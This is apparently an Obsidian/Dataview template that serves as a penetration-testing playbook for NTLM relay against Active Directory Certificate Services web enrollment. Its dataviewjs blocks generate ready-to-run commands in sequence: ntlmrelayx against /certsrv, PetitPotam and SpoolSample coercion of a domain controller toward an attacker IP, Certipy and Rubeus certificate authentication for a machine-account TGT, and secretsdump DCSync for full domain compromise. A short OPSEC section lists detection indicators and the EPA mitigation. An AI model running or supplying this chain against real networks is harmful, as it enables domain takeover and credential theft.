---
# Attack-specific fields
relay_target_url:
ca_server:
ca_name:
victim_host:
captured_cert_b64:
captured_cert_password:
tgt_ticket:
notes:
---

# ADCS — NTLM Relay to HTTP Enrollment

> [!abstract] Attack Summary
> If a CA exposes an HTTP enrollment endpoint (`/certsrv`), it is vulnerable to NTLM relay. Coerce a privileged host (e.g., DC) to authenticate to your machine via SMB, relay that authentication to the CA's web enrollment, and request a certificate on behalf of the victim. Use the cert to obtain a TGT and NTLM hash for the DC machine account.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["LHOST",    b?.lhost    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["CA Server (HTTP relay target)",   `\`INPUT[text:ca_server]\``],
  ["CA Name",                         `\`INPUT[text:ca_name]\``],
  ["Relay Target URL",                `\`INPUT[text:relay_target_url]\``],
  ["Victim Host to Coerce (e.g. DC)", `\`INPUT[text:victim_host]\``],
]);
```

---

## Step 1 — Identify the CA HTTP Endpoint

**Windows — Certify**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe cas\n\n# Look for:\n# - Web Enrollment: Enabled\n# - CA URL: http://CA_SERVER/certsrv\n```");
```

**Linux — Certipy**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\ncertipy find -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -stdout\n\n# Also check manually:\ncurl -k http://CA_SERVER/certsrv\n```");
```

> [!warning] NTLM relay to ADCS HTTP only works if the CA's `/certsrv` endpoint does NOT require extended protection or channel binding. It also requires HTTP (not HTTPS with EPA).

CA Server: `INPUT[text:ca_server]` | CA Name: `INPUT[text:ca_name]`
Relay URL: `INPUT[text:relay_target_url]`

---

## Step 2 — Set Up NTLM Relay

**Linux — ntlmrelayx targeting ADCS**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const lhost     = b?.lhost ?? "ATTACKER_IP";
const caServer  = p?.ca_server || "CA_SERVER";
const relayUrl  = p?.relay_target_url || ("http://" + caServer + "/certsrv/certfnsh.asp");
dv.paragraph("```bash\n# Start ntlmrelayx in ADCS relay mode\nimpacket-ntlmrelayx -t " + relayUrl + " --adcs --template 'DomainController' -smb2support\n\n# Or for a user certificate\nimpacket-ntlmrelayx -t " + relayUrl + " --adcs --template 'User' -smb2support\n```");
```

---

## Step 3 — Coerce Authentication from Victim

**Linux — PetitPotam (MS-EFSRPC)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const lhost    = b?.lhost ?? "ATTACKER_IP";
const victim   = p?.victim_host || "DC_IP_OR_HOSTNAME";
dv.paragraph("```bash\n# Unauthenticated (if patch not applied)\npython3 PetitPotam.py " + lhost + " " + victim + "\n\n# Authenticated\npython3 PetitPotam.py -u '" + (b?.username ?? "USER") + "' -p '" + (b?.password ?? "PASS") + "' -d " + (b?.domain ?? "DOMAIN") + " " + lhost + " " + victim + "\n```");
```

**Windows — SpoolSample**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const lhost  = b?.lhost ?? "ATTACKER_IP";
const victim = p?.victim_host || "DC_HOSTNAME";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe " + victim + " " + lhost + "\n```");
```

Victim host: `INPUT[text:victim_host]`

---

## Step 4 — Capture Certificate from Relay

> [!info] When coercion succeeds, ntlmrelayx captures the certificate in base64 format.

Paste captured certificate (base64): `INPUT[text:captured_cert_b64]`
Certificate password: `INPUT[text:captured_cert_password]`

---

## Step 5 — Authenticate with Certificate

**Linux — Certipy**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain  = b?.domain ?? "DOMAIN";
const dc_ip   = b?.dc_ip  ?? "DC_IP";
const victim  = p?.victim_host || "DC$";
dv.paragraph("```bash\n# Save certificate to file first\necho 'BASE64_CERT' | base64 -d > " + victim.replace('$','') + ".pfx\n\n# Authenticate\ncertipy auth -pfx " + victim.replace('$','') + ".pfx -domain " + domain + " -dc-ip " + dc_ip + "\n\n# Output: NTLM hash + TGT for the machine account\n```");
```

**Windows — Rubeus**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const victim   = p?.victim_host || "DC$";
const certB64  = p?.captured_cert_b64 || "BASE64_CERT";
const certPass = p?.captured_cert_password || "CERT_PASSWORD";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + victim + " /certificate:" + certB64 +
  " /password:\"" + certPass + "\" /domain:" + domain + " /nowrap\n```");
```

Paste TGT: `INPUT[text:tgt_ticket]`

---

## Step 6 — Leverage Machine Account TGT

> [!tip] A DC machine account TGT can be used for DCSync and S4U2Self → full domain compromise.

**Linux — DCSync via machine TGT**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain = b?.domain ?? "DOMAIN";
const victim = p?.victim_host || "DC";
dv.paragraph("```bash\nexport KRB5CCNAME=" + victim + ".ccache\nimpacket-secretsdump -k -no-pass " + domain + "/" + victim + "@" + (b?.dc_fqdn || "DC_FQDN") + "\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - PetitPotam generates **MS-EFSRPC** calls visible in network traffic.
> - **Event 4886/4887** on the CA for the certificate request.
> - Machine accounts authenticating to a non-DC via NTLM is anomalous.
> - EPA (Extended Protection for Authentication) on the CA blocks this attack.

---

## Notes & Results

`INPUT[textarea:notes]`
